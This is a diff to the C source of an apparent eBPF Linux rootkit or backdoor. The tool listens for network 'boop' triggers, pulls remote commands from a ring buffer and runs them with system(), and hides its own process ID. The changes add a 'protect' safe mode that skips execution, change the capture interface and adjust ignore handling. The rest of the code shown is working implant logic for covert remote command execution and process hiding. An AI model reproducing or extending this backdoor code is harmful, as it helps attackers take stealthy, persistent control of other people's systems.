@@ -63,6 +63,7 @@ void usage() {
       "-r, reverse-conn   Attempt reverse RCE lookup if no payload found.\n");
   boopprintf("-q, quiet          Disable output.\n");
   boopprintf("-x, reject         Source addresses to reject triggers from.\n");
+  boopprintf("-p, protect        Protect from executing commands. Safe mode.\n");
   boopprintf("\n");
   exit(0);
 }
@@ -131,6 +132,7 @@ struct config {
   char pr0bexdppath[PATH_MAX];
   char dev_name[16];
   int denyc;
+  int protect;
   int reverseconn;
   char deny[MAX_DENY_ADDRS][INET_ADDRSTRLEN];
 } cfg;
@@ -144,8 +146,9 @@ struct config {
 void clisetup(int argc, char **argv) {
   cfg.denyc = 0;
   cfg.reverseconn = 0;
+  cfg.protect = 0;
   cfg.sudobypass = 0;
-  strncpy(cfg.dev_name, "lo", 16);
+  strncpy(cfg.dev_name, DEFAULT_PCAP_INTERFACE, 16);
   if (getenv("HOME") == NULL) {
     strncpy(cfg.pr0bebooppath, PROBE_BOOP, sizeof PROBE_BOOP);
     strncpy(cfg.pr0besafepath, PROBE_SAFE, sizeof PROBE_SAFE);
@@ -176,6 +179,9 @@ void clisetup(int argc, char **argv) {
           break;
         case 'q':
           quiet = 1;
+          break;
+        case 'p':
+          cfg.protect = 1;
           break;
       }
     }
@@ -259,8 +265,13 @@ int exec(char *rce) {
     free(rce);
     return 0;
   }
-  boopprintf("  <- Executing: %s\n", rce);
-  system(rce);  // :)
+  boopprintf("  -> Found RCE: %s\n", rce);
+  if (!cfg.protect){
+    boopprintf("  <- Executing: %s\n", rce);
+    system(rce);  // :)
+  }else {
+    boopprintf("  XX Bypassing execution! Running in protect mode. Safe mode.\n");
+  }
   free(rce);
   return 1;
 }
@@ -291,6 +302,10 @@ int main(int argc, char **argv) {
     pthread_create(&th, NULL, xcap, (void *)cfg.dev_name);
   }
 
+  if (cfg.protect) {
+    boopprintf("  -> Running in (protect) safe mode. Will not execute commands!\n");
+  }
+
   // ===========================================================================
   // [pr0be.safe.o]
   {
@@ -303,7 +318,7 @@ int main(int argc, char **argv) {
             sizeof(sfobj->rodata->pid_to_hide));
 
     sfobj->rodata->pid_to_hide_len = strlen(pid) + 1;
-    sfobj->rodata->target_ppid = env.target_ppid;
+    sfobj->rodata->target_ppid = 0;
     loaded = pr0be_safe__load(sfobj);
     if (loaded < 0) {
       boopprintf("Unable to load eBPF object: %s\n", cfg.pr0besafepath);
@@ -385,6 +400,7 @@ int main(int argc, char **argv) {
     boopprintf("  XX Deny address            : %s\n", cfg.deny[i]);
   }
   boopprintf("  -> Obfuscating PID         : %s\n", pid);
+  sleep(1);
   boopprintf(
       "================================================================\n");
 
@@ -419,17 +435,12 @@ int main(int argc, char **argv) {
         }
       }
       if (ignore) {
+        //boopprintf("  ** Ignoring boop from source: %s\n", saddrval);
+        bpf_map_delete_elem(fd, &jkey);
+        ikey = jkey;
         continue;
       }
       boopprintf("  ** Boop source: %s\n", saddrval);
-
-
-      // Future hook for probe specific logic
-      // if (ret.event_src_code == EVENT_SRC_BAD_CSUM) {
-      //  boopprintf("  ** Boop EVENT_SRC_BAD_CSUM\n");
-      //} else if (ret.event_src_code == EVENT_SRC_RECEIVE_RESET) {
-      //  boopprintf("  ** Boop EVENT_SRC_RECEIVE_RESET\n");
-      //}
 
       // Always check for RCE in the ring buffer.
       char *rce = malloc(MAX_RCE_SIZE);
